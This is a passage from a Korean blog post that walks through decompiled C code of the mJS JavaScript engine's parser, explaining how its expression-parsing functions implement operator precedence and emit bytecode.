</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">parse_for</span>(p);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( tok <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xD8</span> )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">parse_if</span>(p);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)(tok <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xDA</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span> )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">goto</span> LABEL_36;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( tok <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xDD</span> )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">parse_return</span>(p);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( tok <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xDE</span> <span style="color:#f92672">||</span> tok <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xE0</span> <span style="color:#f92672">||</span> tok <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xE2</span> <span style="color:#f92672">||</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)(tok <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xE4</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span> )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">goto</span> LABEL_36;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">switch</span> ( tok )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0xE6</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">parse_while</span>(p);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0xE7</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>LABEL_36:
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">mjs_set_errorf</span>(p<span style="color:#f92672">-&gt;</span>mjs, MJS_SYNTAX_ERROR, <span style="color:#e6db74">&#34;[%.*s] is not implemented&#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)p<span style="color:#f92672">-&gt;</span>tok.len, p<span style="color:#f92672">-&gt;</span>tok.ptr);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0xE8</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">parse_let</span>(p);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_expr</span>(p);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( res )
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> res;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( p<span style="color:#f92672">-&gt;</span>tok.tok <span style="color:#f92672">!=</span> <span style="color:#ae81ff">4</span> )
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">emit_byte</span>(p, <span style="color:#ae81ff">1u</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">cs_log_print_prefix</span>(LL_VERBOSE_DEBUG, <span style="color:#e6db74">&#34;src/mjs_parser.c&#34;</span>, <span style="color:#ae81ff">948</span>) )
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">cs_log_printf</span>(<span style="color:#e6db74">&#34;  PNEXT %d&#34;</span>, <span style="color:#ae81ff">948LL</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pnext</span>(p);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>parse_statement 함수는 tok에 따라 잘 파싱을 해서 바이트 코드를 점화하는 함수다.
마지막에 parse_expr 함수를 호출한다.</p>
<p>parse_expr 함수는 말 그대로 expression을 파싱하는 함수다.
ternary, logical_or, logical_and, bitwise_or &hellip; shift, plus, minus &hellip; unary 이런식으로 함수를 계속 호출한다.
즉 그냥 연산자 우선순위를 구현한거라고 보면 된다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">mjs_err_t</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">parse_expr</span>(pstate <span style="color:#f92672">*</span>p)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">parse_assignment</span>(p, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">mjs_err_t</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">parse_assignment</span>(pstate <span style="color:#f92672">*</span>p, <span style="color:#66d9ef">int</span> prev_op)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> op; <span style="color:#75715e">// [rsp+4h] [rbp-1Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_err_t</span> res; <span style="color:#75715e">// [rsp+8h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_err_t</span> resa; <span style="color:#75715e">// [rsp+8h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  res <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_ternary</span>(p, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( res <span style="color:#f92672">==</span> MJS_OK )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">findtok</span>(<span style="color:#f92672">&amp;</span>s_assign_ops, p<span style="color:#f92672">-&gt;</span>tok.tok) )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      op <span style="color:#f92672">=</span> p<span style="color:#f92672">-&gt;</span>tok.tok;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">cs_log_print_prefix</span>(LL_VERBOSE_DEBUG, <span style="color:#e6db74">&#34;src/mjs_parser.c&#34;</span>, <span style="color:#ae81ff">503</span>) )
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">cs_log_printf</span>(<span style="color:#e6db74">&#34;  PNEXT %d&#34;</span>, <span style="color:#ae81ff">503LL</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">pnext</span>(p);
</span></span><span style="display:flex;"><span>      resa <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_assignment</span>(p, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( resa )
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> resa;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">emit_op</span>(p, op);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> res;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>삼항 연산자를 먼저 파싱한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">mjs_err_t</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">parse_ternary</span>(pstate <span style="color:#f92672">*</span>p, <span style="color:#66d9ef">int</span> prev_op)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> off_else; <span style="color:#75715e">// [rsp+0h] [rbp-30h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">size_t</span> off_endif; <span style="color:#75715e">// [rsp+8h] [rbp-28h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">size_t</span> off_endifa; <span style="color:#75715e">// [rsp+8h] [rbp-28h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">size_t</span> off_if; <span style="color:#75715e">// [rsp+10h] [rbp-20h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_err_t</span> res; <span style="color:#75715e">// [rsp+18h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_err_t</span> resa; <span style="color:#75715e">// [rsp+18h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_err_t</span> resb; <span style="color:#75715e">// [rsp+18h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  res <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_logical_or</span>(p, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( res <span style="color:#f92672">==</span> MJS_OK )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( prev_op )
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">emit_op</span>(p, prev_op);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( p<span style="color:#f92672">-&gt;</span>tok.tok <span style="color:#f92672">==</span> <span style="color:#ae81ff">21</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">cs_log_print_prefix</span>(LL_VERBOSE_DEBUG, <span style="color:#e6db74">&#34;src/mjs_parser.c&#34;</span>, <span style="color:#ae81ff">470</span>) )
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">cs_log_printf</span>(<span style="color:#e6db74">&#34;  PNEXT %d&#34;</span>, <span style="color:#ae81ff">470LL</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">pnext</span>(p);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">emit_byte</span>(p, <span style="color:#ae81ff">7u</span>);
</span></span><span style="display:flex;"><span>      off_if <span style="color:#f92672">=</span> p<span style="color:#f92672">-&gt;</span>cur_idx;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">emit_init_offset</span>(p);
</span></span><span style="display:flex;"><span>      resa <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_ternary</span>(p, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( resa )
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> resa;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">emit_byte</span>(p, <span style="color:#ae81ff">4u</span>);
</span></span><span style="display:flex;"><span>      off_else <span style="color:#f92672">=</span> p<span style="color:#f92672">-&gt;</span>cur_idx;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">emit_init_offset</span>(p);
</span></span><span style="display:flex;"><span>      off_endif <span style="color:#f92672">=</span> p<span style="color:#f92672">-&gt;</span>cur_idx;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">emit_byte</span>(p, <span style="color:#ae81ff">1u</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( p<span style="color:#f92672">-&gt;</span>tok.tok <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span> )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mjs_set_errorf</span>(
</span></span><span style="display:flex;"><span>          p<span style="color:#f92672">-&gt;</span>mjs,
</span></span><span style="display:flex;"><span>          MJS_SYNTAX_ERROR,
</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;parse error at line %d: [%.*s]&#34;</span>,
</span></span><span style="display:flex;"><span>          (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)p<span style="color:#f92672">-&gt;</span>line_no,
</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">10LL</span>,
</span></span><span style="display:flex;"><span>          p<span style="color:#f92672">-&gt;</span>tok.ptr,
</span></span><span style="display:flex;"><span>          off_else);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">cs_log_print_prefix</span>(LL_VERBOSE_DEBUG, <span style="color:#e6db74">&#34;src/mjs_parser.c&#34;</span>, <span style="color:#ae81ff">485</span>) )
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">cs_log_printf</span>(<span style="color:#e6db74">&#34;  PNEXT %d&#34;</span>, <span style="color:#ae81ff">485LL</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">pnext</span>(p);
</span></span><span style="display:flex;"><span>      resb <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_ternary</span>(p, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( resb )
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> resb;
</span></span><span style="display:flex;"><span>      off_endifa <span style="color:#f92672">=</span> off_endif <span style="color:#f92672">+</span> <span style="color:#a6e22e">mjs_bcode_insert_offset</span>(p, p<span style="color:#f92672">-&gt;</span>mjs, off_else, p<span style="color:#f92672">-&gt;</span>cur_idx <span style="color:#f92672">-</span> off_else <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">mjs_bcode_insert_offset</span>(p, p<span style="color:#f92672">-&gt;</span>mjs, off_if, off_endifa <span style="color:#f92672">-</span> off_if <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> res;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">mjs_err_t</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">parse_logical_or</span>(pstate <span style="color:#f92672">*</span>p, <span style="color:#66d9ef">int</span> prev_op)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint8_t</span> v2; <span style="color:#75715e">// al
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">size_t</span> off_if; <span style="color:#75715e">// [rsp+8h] [rbp-28h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> op; <span style="color:#75715e">// [rsp+14h] [rbp-1Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_err_t</span> res; <span style="color:#75715e">// [rsp+18h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> ops[<span style="color:#ae81ff">2</span>]; <span style="color:#75715e">// [rsp+1Ch] [rbp-14h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> prev_opa; <span style="color:#75715e">// [rsp+24h] [rbp-Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  pstate <span style="color:#f92672">*</span>pa; <span style="color:#75715e">// [rsp+28h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  pa <span style="color:#f92672">=</span> p;
</span></span><span style="display:flex;"><span>  prev_opa <span style="color:#f92672">=</span> prev_op;
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)ops <span style="color:#f92672">=</span> <span style="color:#ae81ff">43LL</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">++</span>p<span style="color:#f92672">-&gt;</span>depth;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( pa<span style="color:#f92672">-&gt;</span>depth <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">512</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_logical_and</span>(pa, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( res <span style="color:#f92672">==</span> MJS_OK )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( prev_opa )
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">emit_op</span>(pa, prev_opa);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">findtok</span>(ops, pa<span style="color:#f92672">-&gt;</span>tok.tok) )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        op <span style="color:#f92672">=</span> pa<span style="color:#f92672">-&gt;</span>tok.tok;
</span></span><span style="display:flex;"><span>        off_if <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( ops[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">42</span> <span style="color:#f92672">||</span> ops[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">43</span> )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          v2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">6</span>;
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( ops[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">42</span> )
</span></span><span style="display:flex;"><span>            v2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>;
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">emit_byte</span>(pa, v2);
</span></span><span style="display:flex;"><span>          off_if <span style="color:#f92672">=</span> pa<span style="color:#f92672">-&gt;</span>cur_idx;
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">emit_init_offset</span>(pa);
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">emit_byte</span>(pa, <span style="color:#ae81ff">1u</span>);
</span></span><span style="display:flex;"><span>          op <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">cs_log_print_prefix</span>(LL_VERBOSE_DEBUG, <span style="color:#e6db74">&#34;src/mjs_parser.c&#34;</span>, <span style="color:#ae81ff">460</span>) )
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">cs_log_printf</span>(<span style="color:#e6db74">&#34;  PNEXT %d&#34;</span>, <span style="color:#ae81ff">460LL</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pnext</span>(pa);
</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_logical_or</span>(pa, op);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( res <span style="color:#f92672">==</span> MJS_OK <span style="color:#f92672">&amp;&amp;</span> off_if )
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">mjs_bcode_insert_offset</span>(pa, pa<span style="color:#f92672">-&gt;</span>mjs, off_if, pa<span style="color:#f92672">-&gt;</span>cur_idx <span style="color:#f92672">-</span> off_if <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mjs_set_errorf</span>(pa<span style="color:#f92672">-&gt;</span>mjs, MJS_SYNTAX_ERROR, <span style="color:#e6db74">&#34;parser stack overflow&#34;</span>);
</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> MJS_SYNTAX_ERROR;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">--</span>pa<span style="color:#f92672">-&gt;</span>depth;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> res;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>함수 기본적인 틀은 다 똑같다.
매크로로 구현해둬서 그렇다.
parse_unary에서만 조금 바뀐다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">mjs_err_t</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">parse_unary</span>(pstate <span style="color:#f92672">*</span>p, <span style="color:#66d9ef">int</span> prev_op)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> op; <span style="color:#75715e">// [rsp+4h] [rbp-1Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_err_t</span> res; <span style="color:#75715e">// [rsp+8h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  op <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">findtok</span>(<span style="color:#f92672">&amp;</span>s_unary_ops, p<span style="color:#f92672">-&gt;</span>tok.tok) )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    op <span style="color:#f92672">=</span> p<span style="color:#f92672">-&gt;</span>tok.tok;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">cs_log_print_prefix</span>(LL_VERBOSE_DEBUG, <span style="color:#e6db74">&#34;src/mjs_parser.c&#34;</span>, <span style="color:#ae81ff">399</span>) )
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">cs_log_printf</span>(<span style="color:#e6db74">&#34;  PNEXT %d&#34;</span>, <span style="color:#ae81ff">399LL</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pnext</span>(p);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">findtok</span>(<span style="color:#f92672">&amp;</span>s_unary_ops, p<span style="color:#f92672">-&gt;</span>tok.tok) )
</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_unary</span>(p, prev_op);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_postfix</span>(p, prev_op);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( res )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> res;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( op )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( op <span style="color:#f92672">==</span> <span style="color:#ae81ff">14</span> )
</span></span><span style="display:flex;"><span>      op <span style="color:#f92672">=</span> <span style="color:#ae81ff">51</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( op <span style="color:#f92672">==</span> <span style="color:#ae81ff">13</span> )
</span></span><span style="display:flex;"><span>      op <span style="color:#f92672">=</span> <span style="color:#ae81ff">50</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">emit_op</span>(p, op);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>일반적인 문자들은 parse_postfix를 타고 들어간다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">mjs_err_t</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">parse_postfix</span>(pstate <span style="color:#f92672">*</span>p, <span style="color:#66d9ef">int</span> prev_op)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> v2; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_err_t</span> res; <span style="color:#75715e">// [rsp+8h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  res <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_call_dot_mem</span>(p, prev_op);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( res )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> res;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( p<span style="color:#f92672">-&gt;</span>tok.tok <span style="color:#f92672">==</span> <span style="color:#ae81ff">29</span> <span style="color:#f92672">||</span> p<span style="color:#f92672">-&gt;</span>tok.tok <span style="color:#f92672">==</span> <span style="color:#ae81ff">28</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    v2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">53</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( p<span style="color:#f92672">-&gt;</span>tok.tok <span style="color:#f92672">==</span> <span style="color:#ae81ff">29</span> )
</span></span><span style="display:flex;"><span>      v2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">52</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">emit_op</span>(p, v2);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">cs_log_print_prefix</span>(LL_VERBOSE_DEBUG, <span style="color:#e6db74">&#34;src/mjs_parser.c&#34;</span>, <span style="color:#ae81ff">389</span>) )
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">cs_log_printf</span>(<span style="color:#e6db74">&#34;  PNEXT %d&#34;</span>, <span style="color:#ae81ff">389LL</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pnext</span>(p);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>parse_call_dot_mem은 그냥 소스코드로 보는게 더 편하다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">mjs_err_t</span> <span style="color:#a6e22e">parse_call_dot_mem</span>(<span style="color:#66d9ef">struct</span> pstate <span style="color:#f92672">*</span>p, <span style="color:#66d9ef">int</span> prev_op) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> ops[] <span style="color:#f92672">=</span> {TOK_DOT, TOK_OPEN_PAREN, TOK_OPEN_BRACKET, TOK_EOF};
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">mjs_err_t</span> res <span style="color:#f92672">=</span> MJS_OK;
